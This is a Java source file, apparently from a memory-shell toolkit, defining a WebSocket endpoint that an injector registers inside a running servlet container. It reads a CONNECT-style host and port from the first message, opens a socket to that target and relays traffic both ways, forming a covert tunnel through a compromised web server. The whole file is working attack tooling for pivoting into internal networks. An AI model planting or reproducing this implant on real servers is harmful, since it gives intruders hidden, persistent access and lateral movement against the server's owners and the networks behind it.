package com.reajason.javaweb.memshell.shelltool.wsproxy;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.CloseReason;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * JSR-356 Endpoint 版本，由注入器从 ServletContext 取 {@code ServerContainer} 后注册。
 *
 * @author ReaJason
 * @since 2026/1/14
 */
public class ProxyWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer>, CompletionHandler<Integer, Session> {
    private Session session;
    private long messageCount = 0;
    private AsynchronousSocketChannel currentClient = null;
    private final ByteBuffer buffer = ByteBuffer.allocate(32768);

    public ProxyWebSocket() {
    }

    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.messageCount = 0;
        this.session = session;
        session.addMessageHandler(this);
    }

    private void readFromServer() {
        if (currentClient != null && currentClient.isOpen() && session.isOpen()) {
            buffer.clear();
            currentClient.read(buffer, session, this);
        }
    }

    @Override
    public void onMessage(ByteBuffer message) {
        try {
            messageCount++;
            process(message, session);
        } catch (Exception e) {
            closeQuietly();
        }
    }

    private void process(ByteBuffer messageBuffer, Session channel) {
        try {
            if (messageCount > 1 && currentClient != null && currentClient.isOpen()) {
                currentClient.write(messageBuffer).get();
            } else if (messageCount == 1) {
                byte[] bytes = new byte[messageBuffer.remaining()];
                messageBuffer.get(bytes);
                String values = new String(bytes);

                String[] array = values.split(" ");
                if (array.length < 2) {
                    reject(channel, "400 Bad Request");
                    return;
                }
                String[] addrArray = array[1].split(":");
                if (addrArray.length < 2) {
                    reject(channel, "400 Bad Request");
                    return;
                }

                currentClient = AsynchronousSocketChannel.open();
                int port = Integer.parseInt(addrArray[1]);
                InetSocketAddress hostAddress = new InetSocketAddress(addrArray[0], port);

                Future<Void> future = currentClient.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch (Exception e) {
                    reject(channel, "503 Service Unavailable");
                    return;
                }
                channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
                readFromServer();
            }
        } catch (Exception e) {
            closeQuietly();
        }
    }


    @Override
    public void completed(Integer result, Session attachment) {
        if (result == -1) {
            closeQuietly();
            return;
        }

        try {
            if (result > 0) {
                buffer.flip();
                if (attachment.isOpen()) {
                    attachment.getBasicRemote().sendBinary(buffer);
                }
            }
            readFromServer();
        } catch (Exception e) {
            closeQuietly();
        }
    }

    @Override
    public void failed(Throwable exc, Session attachment) {
        closeQuietly();
    }

    @Override
    public void onClose(Session session, CloseReason closeReason) {
        closeQuietly();
    }

    @Override
    public void onError(Session session, Throwable thr) {
        closeQuietly();
    }

    /**
     * 建连失败或 CONNECT 报文非法时，先给客户端一个 HTTP 语义的响应，再关闭会话。
     */
    private void reject(Session channel, String status) {
        try {
            channel.getBasicRemote().sendText("HTTP/1.1 " + status + "\r\n\r\n");
        } catch (Exception ignored) {
        }
        closeQuietly();
    }

    private void closeQuietly() {
        try {
            if (currentClient != null && currentClient.isOpen()) {
                currentClient.close();
            }
        } catch (Exception ignored) {
        }
        try {
            if (session != null && session.isOpen()) {
                session.close();
            }
        } catch (Exception ignored) {
        }
    }
}
